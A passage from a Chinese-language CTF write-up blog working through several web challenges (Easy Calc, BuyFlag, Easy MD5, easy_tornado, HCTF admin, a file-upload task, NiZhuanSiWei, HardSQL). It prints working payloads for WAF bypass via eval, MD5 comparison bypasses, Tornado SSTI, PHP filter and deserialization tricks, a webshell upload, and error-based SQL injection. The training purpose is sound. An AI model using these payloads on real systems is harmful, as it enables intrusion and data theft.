src="data:image/gif;base64,R0lGODlhAQABAPABAP///wAAACH5BAEKAAAALAAAAAABAAEAAAICRAEAOw=="></p><h1 id="RoarCTF-2019-Easy-Calc"><a href="#RoarCTF-2019-Easy-Calc" class="headerlink" title="[RoarCTF 2019]Easy Calc"></a>[RoarCTF 2019]Easy Calc</h1><h3 id="一、本题做题思路-13"><a href="#一、本题做题思路-13" class="headerlink" title="一、本题做题思路"></a>一、本题做题思路</h3><p>光看页面就是简单的计算器</p><p><img src="https://dao-1-1317774468.cos.ap-nanjing.myqcloud.com/images/202306041754486.png"><img src="data:image/gif;base64,R0lGODlhAQABAPABAP///wAAACH5BAEKAAAALAAAAAABAAEAAAICRAEAOw==">所以从源代码里面找找线索，找到了一个calc.php。和题主用waf来确保安全，访问calc.php</p><p> <img src="https://dao-1-1317774468.cos.ap-nanjing.myqcloud.com/images/202306041755628.png"><img src="data:image/gif;base64,R0lGODlhAQABAPABAP///wAAACH5BAEKAAAALAAAAAABAAEAAAICRAEAOw=="><img src="https://dao-1-1317774468.cos.ap-nanjing.myqcloud.com/images/202306041755604.png"><img src="data:image/gif;base64,R0lGODlhAQABAPABAP///wAAACH5BAEKAAAALAAAAAABAAEAAAICRAEAOw==">源代码如下:</p><pre class="line-numbers language-php" data-language="php"><code class="language-php">&lt;?phperror_reporting(0);if(!isset($_GET[&#39;num&#39;]))&#123;    show_source(__FILE__);&#125;else&#123;        $str &#x3D; $_GET[&#39;num&#39;];  &#x2F;&#x2F;get传参        $blacklist &#x3D; [&#39; &#39;, &#39;\t&#39;, &#39;\r&#39;, &#39;\n&#39;,&#39;\&#39;&#39;, &#39;&quot;&#39;, &#39;&#96;&#39;, &#39;\[&#39;, &#39;\]&#39;,&#39;\$&#39;,&#39;\\&#39;,&#39;\^&#39;];        foreach ($blacklist as $blackitem) &#123;                if (preg_match(&#39;&#x2F;&#39; . $blackitem . &#39;&#x2F;m&#39;, $str)) &#123;                        die(&quot;what are you want to do?&quot;);                &#125;        &#125;        eval(&#39;echo &#39;.$str.&#39;;&#39;);&#125;?&gt;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><img src="data:image/gif;base64,R0lGODlhAQABAPABAP///wAAACH5BAEKAAAALAAAAAABAAEAAAICRAEAOw=="><strong>preg_match 函数用于执行一个正则表达式匹配。</strong> </p><p>再结合上面所给的提示，所以我们需要用php的字符串解析特性从而达到绕过waf的效果，可以在num前加一个空格(或者加一个+)。</p><blockquote><p>构造payload: url+&#x2F;calc.php? num&#x3D;print_r(scandir(‘&#x2F;‘));</p></blockquote><p>得到的是错误的回显，放入BP查看，发现其把’ ‘给过滤掉了</p><p><img src="https://dao-1-1317774468.cos.ap-nanjing.myqcloud.com/images/202306041756801.png"><img src="data:image/gif;base64,R0lGODlhAQABAPABAP///wAAACH5BAEKAAAALAAAAAABAAEAAAICRAEAOw=="><img src="https://dao-1-1317774468.cos.ap-nanjing.myqcloud.com/images/202306041756862.png"><img src="data:image/gif;base64,R0lGODlhAQABAPABAP///wAAACH5BAEKAAAALAAAAAABAAEAAAICRAEAOw==">不过我们还可以通过chr()绕过，chr(47),47就是代表&#x2F;</p><p><img src="https://dao-1-1317774468.cos.ap-nanjing.myqcloud.com/images/202306041756826.png"><img src="data:image/gif;base64,R0lGODlhAQABAPABAP///wAAACH5BAEKAAAALAAAAAABAAEAAAICRAEAOw=="><img src="https://dao-1-1317774468.cos.ap-nanjing.myqcloud.com/images/202306041756800.png"><img src="data:image/gif;base64,R0lGODlhAQABAPABAP///wAAACH5BAEKAAAALAAAAAABAAEAAAICRAEAOw=="></p><blockquote><p>所以可以构造为  url+&#x2F;calc.php? num&#x3D;print_r(scandir(chr(47)));</p><p>&#x2F;&#x2F;也可以使用var_dump()代替print_r();</p></blockquote><p><img src="https://dao-1-1317774468.cos.ap-nanjing.myqcloud.com/images/202306041756840.png"><img src="data:image/gif;base64,R0lGODlhAQABAPABAP///wAAACH5BAEKAAAALAAAAAABAAEAAAICRAEAOw==">在第八个找到我们的目标，因为它把’ ‘过滤了，所以我们只能chr()一个字符一个字符的绕过</p><blockquote><p>构造为 </p><pre class="line-numbers language-php" data-language="php"><code class="language-php">url+&#x2F;calc.php? num&#x3D;print_r(file_get_contents(chr(47).chr(102).chr(49).chr(97).chr(103).chr(103)));<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="data:image/gif;base64,R0lGODlhAQABAPABAP///wAAACH5BAEKAAAALAAAAAABAAEAAAICRAEAOw==" alt="点击并拖拽以移动"></p><p>类似于 url+&#x2F;?calc.php? num&#x3D;print_r(file_get_contents(‘&#x2F;f1agg’));</p></blockquote><p>从而得到flag</p><p><img src="https://dao-1-1317774468.cos.ap-nanjing.myqcloud.com/images/202306041756870.png"><img src="data:image/gif;base64,R0lGODlhAQABAPABAP///wAAACH5BAEKAAAALAAAAAABAAEAAAICRAEAOw=="></p><h3 id="二、本题知识点-7"><a href="#二、本题知识点-7" class="headerlink" title="二、本题知识点"></a>二、本题知识点</h3><p>(1)、chr绕过，当出现类似于’ ‘和&#x2F;过滤的时候可以考虑通过chr来进行绕过，从而完成所想达到的目的。</p><p>(2)、利用php字符的解析特性从而达到绕过waf的目的。</p><p>*<em>PHP需要将所有参数转换为有效的变量名，因此在解析查询*</em><a href="https://so.csdn.net/so/search?q=%E5%AD%97%E7%AC%A6%E4%B8%B2&spm=1001.2101.3001.7020">字符串</a>*<em>时，它会做两件事：</em>*</p><p><strong>(1）删除空白符</strong></p><p><strong>(2）将某些字符转换为下划线（包括空格）</strong></p><h2 id="极客大挑战-2019-BuyFlag"><a href="#极客大挑战-2019-BuyFlag" class="headerlink" title="[极客大挑战 2019]BuyFlag"></a>[极客大挑战 2019]BuyFlag</h2><h3 id="一、本题做题思路-14"><a href="#一、本题做题思路-14" class="headerlink" title="一、本题做题思路"></a>一、本题做题思路</h3><p>打开后发现和上面哪一题界面一模一样,老规矩，从源代码里面找找线索</p><p><img src="https://dao-1-1317774468.cos.ap-nanjing.myqcloud.com/images/202306041757291.png"><img src="data:image/gif;base64,R0lGODlhAQABAPABAP///wAAACH5BAEKAAAALAAAAAABAAEAAAICRAEAOw==">发现一个独特的php，访问一下看看能得到什么 </p><p><img src="https://dao-1-1317774468.cos.ap-nanjing.myqcloud.com/images/202306041757297.png"><img src="data:image/gif;base64,R0lGODlhAQABAPABAP///wAAACH5BAEKAAAALAAAAAABAAEAAAICRAEAOw==">flag需要money&#x3D;100000000，然后必须是来自CUIT的学生。 </p><p>其界面写出了要得到flag的限制条件，在源代码里面则是有着一串代码</p><pre class="line-numbers language-php" data-language="php"><code class="language-php">&lt;!--~~~post money and password~~~if (isset($_POST[&#39;password&#39;])) &#123;$password &#x3D; $_POST[&#39;password&#39;];if (is_numeric($password)) &#123;echo &quot;password can&#39;t be number&lt;&#x2F;br&gt;&quot;;&#x2F;&#x2F;判断password是不是数字。&#125;elseif ($password &#x3D;&#x3D; 404) &#123;echo &quot;Password Right!&lt;&#x2F;br&gt;&quot;;&#125;&#125;--&gt;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><img src="data:image/gif;base64,R0lGODlhAQABAPABAP///wAAACH5BAEKAAAALAAAAAABAAEAAAICRAEAOw==">看到cookie等于0,考虑到计算机的世界只有俩个数字(滑稽)。尝试改成1后再传password的参试试。 </p><p><img src="https://dao-1-1317774468.cos.ap-nanjing.myqcloud.com/images/202306041758517.png"><img src="data:image/gif;base64,R0lGODlhAQABAPABAP///wAAACH5BAEKAAAALAAAAAABAAEAAAICRAEAOw=="><img src="https://dao-1-1317774468.cos.ap-nanjing.myqcloud.com/images/202306041758605.png"><img src="data:image/gif;base64,R0lGODlhAQABAPABAP///wAAACH5BAEKAAAALAAAAAABAAEAAAICRAEAOw==">修改后需要我们满足另一个条件了足够的钱，根据上面代码所表示，钱是$money。发现如果直接传money&#x3D;100000000会出现如下图的结果。</p><p><img src="https://dao-1-1317774468.cos.ap-nanjing.myqcloud.com/images/202306041758662.png"><img src="data:image/gif;base64,R0lGODlhAQABAPABAP///wAAACH5BAEKAAAALAAAAAABAAEAAAICRAEAOw==">根据我们以往所学，他说字符太长了，我们可以通过科学计数法来解决这种问题</p><blockquote><p>构造payload  password&#x3D;404a&amp;money&#x3D;1e9 </p></blockquote><p><img src="https://dao-1-1317774468.cos.ap-nanjing.myqcloud.com/images/202306041758573.png"><img src="data:image/gif;base64,R0lGODlhAQABAPABAP///wAAACH5BAEKAAAALAAAAAABAAEAAAICRAEAOw=="></p><h2 id="BJDCTF2020-Easy-MD5"><a href="#BJDCTF2020-Easy-MD5" class="headerlink" title="[BJDCTF2020]Easy MD5"></a>[BJDCTF2020]Easy MD5</h2><h3 id="一、本题做题思路-15"><a href="#一、本题做题思路-15" class="headerlink" title="一、本题做题思路"></a>一、本题做题思路</h3><p>打开界面什么都得不到，输入也没什么变化</p><p><img src="https://dao-1-1317774468.cos.ap-nanjing.myqcloud.com/images/202306041759496.png"><img src="data:image/gif;base64,R0lGODlhAQABAPABAP///wAAACH5BAEKAAAALAAAAAABAAEAAAICRAEAOw==">在抓包的时候找到了提示<img src="https://dao-1-1317774468.cos.ap-nanjing.myqcloud.com/images/202306041759493.png"><img src="data:image/gif;base64,R0lGODlhAQABAPABAP///wAAACH5BAEKAAAALAAAAAABAAEAAAICRAEAOw==">即构造$pass经md5加密后出现**<code>or</code>** ，可令该SQL语句返回**<code>true</code><strong>。不过还是不会，看大佬WP是用</strong><code>ffifdyop</code><strong>绕过，因为这个字符被MD5哈希了之后前几位刚好是</strong><code>&#39; or &#39;6</code>** 所以这里就绕过去了。</p><p>跳转到一个新的网站，从源代码里可以找到本题解题关键</p><p><img src="https://dao-1-1317774468.cos.ap-nanjing.myqcloud.com/images/202306041800595.png"><img src="data:image/gif;base64,R0lGODlhAQABAPABAP///wAAACH5BAEKAAAALAAAAAABAAEAAAICRAEAOw=="></p><pre class="line-numbers language-php" data-language="php"><code class="language-php">&lt;!--$a &#x3D; $GET[&#39;a&#39;];$b &#x3D; $_GET[&#39;b&#39;];if($a !&#x3D; $b &amp;&amp; md5($a) &#x3D;&#x3D; md5($b))&#123;    &#x2F;&#x2F; wow, glzjin wants a girl friend.--&gt;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><img src="data:image/gif;base64,R0lGODlhAQABAPABAP///wAAACH5BAEKAAAALAAAAAABAAEAAAICRAEAOw==">$a不等于$b，但是md5($a)等于md5($b),平常经常遇到的md5弱等于绕过。</p><blockquote><p>可以构建   url+&#x2F;levels91.php?a&#x3D;QNKCDZO&amp;b&#x3D;240610708</p></blockquote><p>又进入一个新的网页</p><p><img src="https://dao-1-1317774468.cos.ap-nanjing.myqcloud.com/images/202306041800536.png"><img src="data:image/gif;base64,R0lGODlhAQABAPABAP///wAAACH5BAEKAAAALAAAAAABAAEAAAICRAEAOw=="></p><pre class="line-numbers language-php" data-language="php"><code class="language-php"> &lt;?phperror_reporting(0);include &quot;flag.php&quot;;highlight_file(__FILE__);if($_POST[&#39;param1&#39;]!&#x3D;&#x3D;$_POST[&#39;param2&#39;]&amp;&amp;md5($_POST[&#39;param1&#39;])&#x3D;&#x3D;&#x3D;md5($_POST[&#39;param2&#39;]))&#123;    echo $flag;&#125; <span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><img src="data:image/gif;base64,R0lGODlhAQABAPABAP///wAAACH5BAEKAAAALAAAAAABAAEAAAICRAEAOw==">这又考我们md5强等于绕过，可以通过数组绕过来得到flag</p><blockquote><p>构建payload为 param1[]&#x3D;1&amp;param2[]&#x3D;2 </p></blockquote><p>得到flag</p><p><img src="https://dao-1-1317774468.cos.ap-nanjing.myqcloud.com/images/202306041800930.png"><img src="data:image/gif;base64,R0lGODlhAQABAPABAP///wAAACH5BAEKAAAALAAAAAABAAEAAAICRAEAOw=="></p><h3 id="二、本题知识点-8"><a href="#二、本题知识点-8" class="headerlink" title="二、本题知识点"></a>二、本题知识点</h3><blockquote><p>(1)、绕过md5进行注入，通过其进行哈希后的前几位字母满足注入公式所需从而达成目的</p><p>(2)、MD5弱等于绕过，其实可以看<a href="https://www.cnblogs.com/87x00/p/15832075.html">这个佬的博客</a>，已经将弱等于和强等于都说了，弱等于就是部分字符串md5后是0exxx，刚好满足科学计数法，在弱等于当中，函数会判断其相等，但是其本质又不想等，所以可以绕过</p><p>(3)、MD5强等于绕过，通过数组进行绕过。因为md5函数无法处理数组。</p></blockquote><h2 id="护网杯-2018-easy-tornado"><a href="#护网杯-2018-easy-tornado" class="headerlink" title="[护网杯 2018]easy_tornado"></a>[护网杯 2018]easy_tornado</h2><h3 id="一、本题做题思路-16"><a href="#一、本题做题思路-16" class="headerlink" title="一、本题做题思路"></a>一、本题做题思路</h3><p>打开发现有三个txt文件</p><p><img src="https://dao-1-1317774468.cos.ap-nanjing.myqcloud.com/images/202306041801607.png"><img src="data:image/gif;base64,R0lGODlhAQABAPABAP///wAAACH5BAEKAAAALAAAAAABAAEAAAICRAEAOw=="></p><p>flag.txt</p><p><img src="https://dao-1-1317774468.cos.ap-nanjing.myqcloud.com/images/202306041801589.png"><img src="data:image/gif;base64,R0lGODlhAQABAPABAP///wAAACH5BAEKAAAALAAAAAABAAEAAAICRAEAOw==">welcome.txt</p><p><img src="https://dao-1-1317774468.cos.ap-nanjing.myqcloud.com/images/202306041801598.png"><img src="data:image/gif;base64,R0lGODlhAQABAPABAP///wAAACH5BAEKAAAALAAAAAABAAEAAAICRAEAOw=="> hints.txt</p><p><img src="https://dao-1-1317774468.cos.ap-nanjing.myqcloud.com/images/202306041801599.png"><img src="data:image/gif;base64,R0lGODlhAQABAPABAP///wAAACH5BAEKAAAALAAAAAABAAEAAAICRAEAOw==">且当我们在访问的时候，我们可以发现有参数传入</p><p><img src="https://dao-1-1317774468.cos.ap-nanjing.myqcloud.com/images/202306041801611.png"><img src="data:image/gif;base64,R0lGODlhAQABAPABAP///wAAACH5BAEKAAAALAAAAAABAAEAAAICRAEAOw=="><strong>filename</strong>和<strong>filehash 。</strong>   </p><p>结合flag.txt里的内容，想要得到flag应该是构造</p><blockquote><p>url+&#x2F;file?filename&#x3D;&#x2F;fllllllllllllag&amp;filehash&#x3D;md5(cookie_secret+md5(filename))</p></blockquote><p>但是我们不知道cookie_secret在哪。不过既然flag.txt和hints.txt都用了，那么八成线索是在最后一个文本render。通过上网查询和看大佬wp。得知**render()**是tornado里的函数，可以**生成html模板。**再结合本题题目easy_tornado。猜测为SSTI服务器模板注入。</p><p>具体可去<a href="https://www.tornadoweb.org/en/stable/web.html">该网站</a>了解</p><p>所以先尝试</p><blockquote><p>url+&#x2F;file?filename&#x3D;&#x2F;fllllllllllllag&amp;filehash&#x3D;1    （{是{,}是}）</p></blockquote><p>回显为 Error</p><p><img src="https://dao-1-1317774468.cos.ap-nanjing.myqcloud.com/images/202306041801591.png"><img src="data:image/gif;base64,R0lGODlhAQABAPABAP///wAAACH5BAEKAAAALAAAAAABAAEAAAICRAEAOw==">报错说明可能存在过滤，尝试通过该模板测试是否有SSTI注入</p><blockquote><p>url+&#x2F;error?msg&#x3D;1     </p></blockquote><p><img src="https://dao-1-1317774468.cos.ap-nanjing.myqcloud.com/images/202306041801968.png"><img src="data:image/gif;base64,R0lGODlhAQABAPABAP///wAAACH5BAEKAAAALAAAAAABAAEAAAICRAEAOw==">能注入，所以我们可以去尝试找到cookie_secret</p><p>在Tornado框架的附属文件handler.settings中存在cookie_secret。所以我们可以构造payload如下</p><blockquote><p>url+&#x2F;error?msg&#x3D; </p></blockquote><p>得到cookie_secret。</p><blockquote><p>cookie_secret&#x3D;3742f17c04ab407ca3bf4fa775921ec2(杠被我去掉了)</p></blockquote><p>重新返回最初的地方去尝试获取flag。</p><blockquote><p>即可构造url+&#x2F;file?filename&#x3D;&#x2F;fllllllllllllag&amp;filehash&#x3D;md5(cookie_secret+md5(&#x2F;fllllllllllllag))</p></blockquote><p>经过计算可构造</p><blockquote><p>url+&#x2F;file?filename&#x3D;&#x2F;fllllllllllllag&amp;filehash&#x3D;57fb487e8a01aeae99949369c6022f78</p></blockquote><p>得到flag</p><p><img src="https://dao-1-1317774468.cos.ap-nanjing.myqcloud.com/images/202306041801964.png"><img src="data:image/gif;base64,R0lGODlhAQABAPABAP///wAAACH5BAEKAAAALAAAAAABAAEAAAICRAEAOw=="></p><h3 id="二、本题知识点-9"><a href="#二、本题知识点-9" class="headerlink" title="二、本题知识点"></a>二、本题知识点</h3><p> 基本上都是参考这个<a href="https://blog.csdn.net/qq_51927659/article/details/116031923?spm=1001.2014.3001.5502">大佬博客</a>从而达到复现的结果。</p><h2 id="HCTF-2018-admin"><a href="#HCTF-2018-admin" class="headerlink" title="[HCTF 2018]admin"></a>[HCTF 2018]admin</h2><h3 id="一、本题做题思路-17"><a href="#一、本题做题思路-17" class="headerlink" title="一、本题做题思路"></a>一、本题做题思路</h3><p><img src="https://dao-1-1317774468.cos.ap-nanjing.myqcloud.com/images/202306041803458.png"><img src="data:image/gif;base64,R0lGODlhAQABAPABAP///wAAACH5BAEKAAAALAAAAAABAAEAAAICRAEAOw==">通过主页面发现有俩个选项，一个登录，一个注册。根据题目先试试admin登录一下</p><p>额，发现username输入admin password输入123直接就得到了flag</p><p> <img src="https://dao-1-1317774468.cos.ap-nanjing.myqcloud.com/images/202306041803668.png"><img src="data:image/gif;base64,R0lGODlhAQABAPABAP///wAAACH5BAEKAAAALAAAAAABAAEAAAICRAEAOw==">但这题其实有很多解法，例如flask 伪造，session漏洞和Unicode欺骗，前俩个学的不咋地，这里就用Unicode欺骗来解决一下。</p><p>我们可以从Unicode字符表里找到如下图的位置 <a href="https://www.rapidtables.org/zh-CN/code/text/unicode-characters.html">该表网址</a></p><p><img src="https://dao-1-1317774468.cos.ap-nanjing.myqcloud.com/images/202306041803663.png"><img src="data:image/gif;base64,R0lGODlhAQABAPABAP///wAAACH5BAEKAAAALAAAAAABAAEAAAICRAEAOw==">从里面凑齐一个ᴬᴰᴹᴵᴺ，然后注册，注册完后登录然后进行修改密码。</p><p>然后再用修改后的密码，用户名为admin登录得到flag</p><p><img src="https://dao-1-1317774468.cos.ap-nanjing.myqcloud.com/images/202306041803630.png"><img src="data:image/gif;base64,R0lGODlhAQABAPABAP///wAAACH5BAEKAAAALAAAAAABAAEAAAICRAEAOw==">其原理为 当我们在注册的时候 ”ᴬᴰᴹᴵᴺ“ 经过strlower()，转成”ADMIN“ ， 在修改密码的时候 ”ADMIN“经过strlower()变成”admin“ , 当我们再次退出登录的时候 ”admin“经过strlower()变成”admin”</p><p><strong>strlower:将字符串转换为小写。</strong></p><h3 id="二、本题知识点-10"><a href="#二、本题知识点-10" class="headerlink" title="二、本题知识点"></a>二、本题知识点</h3><p>通过Unicode欺骗使自己成为admin登录网站得到flag</p><p>以及弱口令爆破。</p><p>如果想知道另俩种做法，可以看这位<a href="https://www.cnblogs.com/chrysanthemum/p/11722351.html">大佬博客</a></p><h2 id="MRCTF2020-你传你🐎呢"><a href="#MRCTF2020-你传你🐎呢" class="headerlink" title="[MRCTF2020]你传你🐎呢"></a>[MRCTF2020]你传你🐎呢</h2><p>一、本题做题思路</p><p><img src="https://dao-1-1317774468.cos.ap-nanjing.myqcloud.com/images/202306041805097.png"><img src="data:image/gif;base64,R0lGODlhAQABAPABAP///wAAACH5BAEKAAAALAAAAAABAAEAAAICRAEAOw==">一道Upload的题，尝试上传一下PHP文件</p><p><img src="https://dao-1-1317774468.cos.ap-nanjing.myqcloud.com/images/202306041805013.png"><img src="data:image/gif;base64,R0lGODlhAQABAPABAP///wAAACH5BAEKAAAALAAAAAABAAEAAAICRAEAOw==">传不进去，通过图片传入试试</p><p> <img src="https://dao-1-1317774468.cos.ap-nanjing.myqcloud.com/images/202306041805556.png"><img src="data:image/gif;base64,R0lGODlhAQABAPABAP///wAAACH5BAEKAAAALAAAAAABAAEAAAICRAEAOw==">回显为成功上传，那么通过htaccess文件来使蚁剑连接</p><p><img src="https://dao-1-1317774468.cos.ap-nanjing.myqcloud.com/images/202306041805593.png"><img src="data:image/gif;base64,R0lGODlhAQABAPABAP///wAAACH5BAEKAAAALAAAAAABAAEAAAICRAEAOw==">成功上传</p><p><img src="https://dao-1-1317774468.cos.ap-nanjing.myqcloud.com/images/202306041805562.png"><img src="data:image/gif;base64,R0lGODlhAQABAPABAP///wAAACH5BAEKAAAALAAAAAABAAEAAAICRAEAOw==">成功进入，通过主目录内找到flag</p><p><img src="https://dao-1-1317774468.cos.ap-nanjing.myqcloud.com/images/202306041805573.png"><img src="data:image/gif;base64,R0lGODlhAQABAPABAP///wAAACH5BAEKAAAALAAAAAABAAEAAAICRAEAOw=="><img src="https://dao-1-1317774468.cos.ap-nanjing.myqcloud.com/images/202306041805588.png"><img src="data:image/gif;base64,R0lGODlhAQABAPABAP///wAAACH5BAEKAAAALAAAAAABAAEAAAICRAEAOw=="></p><h2 id="ZJCTF-2019-NiZhuanSiWei"><a href="#ZJCTF-2019-NiZhuanSiWei" class="headerlink" title="[ZJCTF 2019]NiZhuanSiWei"></a>[ZJCTF 2019]NiZhuanSiWei</h2><h3 id="一、本题做题思路-18"><a href="#一、本题做题思路-18" class="headerlink" title="一、本题做题思路"></a>一、本题做题思路</h3><p><img src="https://dao-1-1317774468.cos.ap-nanjing.myqcloud.com/images/202306041806984.png"><img src="data:image/gif;base64,R0lGODlhAQABAPABAP///wAAACH5BAEKAAAALAAAAAABAAEAAAICRAEAOw==">打开后就是一串php代码。</p><pre class="line-numbers language-php" data-language="php"><code class="language-php">&lt;?php  $text &#x3D; $_GET[&quot;text&quot;];$file &#x3D; $_GET[&quot;file&quot;];$password &#x3D; $_GET[&quot;password&quot;];if(isset($text)&amp;&amp;(file_get_contents($text,&#39;r&#39;)&#x3D;&#x3D;&#x3D;&quot;welcome to the zjctf&quot;))&#123;&#x2F;&#x2F;要求我们传入一个text文件，内容为welcome to the zjctf    echo &quot;&lt;br&gt;&lt;h1&gt;&quot;.file_get_contents($text,&#39;r&#39;).&quot;&lt;&#x2F;h1&gt;&lt;&#x2F;br&gt;&quot;;    if(preg_match(&quot;&#x2F;flag&#x2F;&quot;,$file))&#123;&#x2F;&#x2F;正则运算将flag过滤        echo &quot;Not now!&quot;;        exit();     &#125;else&#123;        include($file);  &#x2F;&#x2F;useless.php&#x2F;&#x2F;提示一个php        $password &#x3D; unserialize($password);        echo $password;    &#125;&#125;else&#123;    highlight_file(__FILE__);&#125;?&gt;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><img src="data:image/gif;base64,R0lGODlhAQABAPABAP///wAAACH5BAEKAAAALAAAAAABAAEAAAICRAEAOw==">**file_get_contents()**函数在我们上面一道题中使用过，是用来读取文件。’r’是读取方式</p><p>通过<strong>php:&#x2F;&#x2F;input</strong>绕过该函数 </p><p><img src="https://dao-1-1317774468.cos.ap-nanjing.myqcloud.com/images/202306041806850.png"></p><p>正则将flag过滤了，下面给出一个php，但如果直接访问只会得到一个白屏，其他什么也得不到</p><p>所以我们可以通过php伪协议 php:&#x2F;&#x2F;filter 读取</p><blockquote><p>所以构造payload url+&#x2F;?text&#x3D;php:&#x2F;&#x2F;input&amp;file&#x3D;php:&#x2F;&#x2F;filter&#x2F;read&#x3D;convert.base64-encode&#x2F;resource&#x3D;useless.php</p></blockquote><p><img src="https://dao-1-1317774468.cos.ap-nanjing.myqcloud.com/images/202306041807697.png">得到一串base64代码，解密后得到</p><pre class="line-numbers language-php" data-language="php"><code class="language-php">&lt;?php   class Flag&#123;  &#x2F;&#x2F;flag.php      public $file;      public function __tostring()&#123;          if(isset($this-&gt;file))&#123;              echo file_get_contents($this-&gt;file);             echo &quot;&lt;br&gt;&quot;;        return (&quot;U R SO CLOSE !&#x2F;&#x2F;&#x2F;COME ON PLZ&quot;);        &#125;      &#125;  &#125;  ?&gt;  <span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><img src="data:image/gif;base64,R0lGODlhAQABAPABAP///wAAACH5BAEKAAAALAAAAAABAAEAAAICRAEAOw==">再结合主页面的unserialize()函数，显然我们需要将这个进行序列化</p><p><img src="https://dao-1-1317774468.cos.ap-nanjing.myqcloud.com/images/202306041807656.png"><img src="data:image/gif;base64,R0lGODlhAQABAPABAP///wAAACH5BAEKAAAALAAAAAABAAEAAAICRAEAOw=="></p><blockquote><p> 然后输入最终的payload</p><p>url+&#x2F;?text&#x3D;php:&#x2F;&#x2F;input&amp;file&#x3D;useless.php&amp;password&#x3D;O:4:”Flag”:1:{s:4:”file”;s:8:”flag.php”;}</p></blockquote><p><img src="https://dao-1-1317774468.cos.ap-nanjing.myqcloud.com/images/202306041807815.png"></p><p>得到flag</p><p><img src="https://dao-1-1317774468.cos.ap-nanjing.myqcloud.com/images/202306041807711.png"></p><h2 id="极客大挑战-2019-HardSQL"><a href="#极客大挑战-2019-HardSQL" class="headerlink" title="[极客大挑战 2019]HardSQL"></a>[极客大挑战 2019]HardSQL</h2><h3 id="一、本题做题思路-19"><a href="#一、本题做题思路-19" class="headerlink" title="一、本题做题思路"></a>一、本题做题思路</h3><p> SQL注入，先看是什么闭合方式</p><p><img src="https://dao-1-1317774468.cos.ap-nanjing.myqcloud.com/images/202306041808245.png"><img src="data:image/gif;base64,R0lGODlhAQABAPABAP///wAAACH5BAEKAAAALAAAAAABAAEAAAICRAEAOw=="><img src="https://dao-1-1317774468.cos.ap-nanjing.myqcloud.com/images/202306041808154.png"><img src="data:image/gif;base64,R0lGODlhAQABAPABAP///wAAACH5BAEKAAAALAAAAAABAAEAAAICRAEAOw==">确定为’闭合。<img src="https://dao-1-1317774468.cos.ap-nanjing.myqcloud.com/images/202306041808161.png"><img src="data:image/gif;base64,R0lGODlhAQABAPABAP///wAAACH5BAEKAAAALAAAAAABAAEAAAICRAEAOw==">union被过滤掉 ，还有空格也被过滤，所以我们需要使用括号绕过，但同时这道题没有过滤extractvalue。所以我们可以尝试用这来解决问题</p><p><strong>获取数据库名</strong></p><pre class="line-numbers language-php" data-language="php"><code class="language-php">username&#x3D;1&#39;^extractvalue(1,concat(0x7e,(select(database()))))%23&amp;password&#x3D;1<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="data:image/gif;base64,R0lGODlhAQABAPABAP///wAAACH5BAEKAAAALAAAAAABAAEAAAICRAEAOw=="><img src="https://dao-1-1317774468.cos.ap-nanjing.myqcloud.com/images/202306041808227.png"></p><p> <strong>爆破表名得到字段名</strong> </p><pre class="line-numbers language-php" data-language="php"><code class="language-php">username&#x3D;1&#39;^extractvalue(1,concat(0x7e,(select(group_concat(table_name))from(information_schema.tables)where(table_schema)like(&#39;geek&#39;))))%23&amp;password&#x3D;1<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="data:image/gif;base64,R0lGODlhAQABAPABAP///wAAACH5BAEKAAAALAAAAAABAAEAAAICRAEAOw=="><img src="https://img-blog.csdnimg.cn/16f5b94d16224701aa37757f559c599e.png"><img src="data:image/gif;base64,R0lGODlhAQABAPABAP///wAAACH5BAEKAAAALAAAAAABAAEAAAICRAEAOw=="> <strong>查看字段名内内容</strong></p><pre class="line-numbers language-php" data-language="php"><code class="language-php">username&#x3D;1&#39;^extractvalue(1,concat(0x7e,(select(group_concat(column_name))from(information_schema.columns)where(table_name)like(&#39;H4rDsq1&#39;))))%23&amp;password&#x3D;1<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="data:image/gif;base64,R0lGODlhAQABAPABAP///wAAACH5BAEKAAAALAAAAAABAAEAAAICRAEAOw=="><img src="https://dao-1-1317774468.cos.ap-nanjing.myqcloud.com/images/202306041808264.png"><img src="data:image/gif;base64,R0lGODlhAQABAPABAP///wAAACH5BAEKAAAALAAAAAABAAEAAAICRAEAOw=="> <strong>获取用户名和密码，出现一部分flag</strong></p><pre class="line-numbers language-php" data-language="php"><code class="language-php">&#x2F;check.php?username&#x3D;1&#39;^extractvalue(1,concat(0x7e,(select(group_concat(password))from(H4rDsq1))))%23&amp;password&#x3D;1<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="data:image/gif;base64,R0lGODlhAQABAPABAP///wAAACH5BAEKAAAALAAAAAABAAEAAAICRAEAOw=="><img src="https://dao-1-1317774468.cos.ap-nanjing.myqcloud.com/images/202306041808731.png"><img src="data:image/gif;base64,R0lGODlhAQABAPABAP///wAAACH5BAEKAAAALAAAAAABAAEAAAICRAEAOw==">然后可以使用left()和right()函数进行拼接，这里直接使用right函数，然后再把重复的删去组成flag</p><pre class="line-numbers language-php" data-language="php"><code class="language-php">username&#x3D;1&#39;^extractvalue(1,concat(0x7e,(select(group_concat(right(password,20)))from(H4rDsq1))))%23&amp;password&#x3D;1<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="data:image/gif;base64,R0lGODlhAQABAPABAP///wAAACH5BAEKAAAALAAAAAABAAEAAAICRAEAOw=="><img src="https://dao-1-1317774468.cos.ap-nanjing.myqcloud.com/images/202306041808951.png"><img 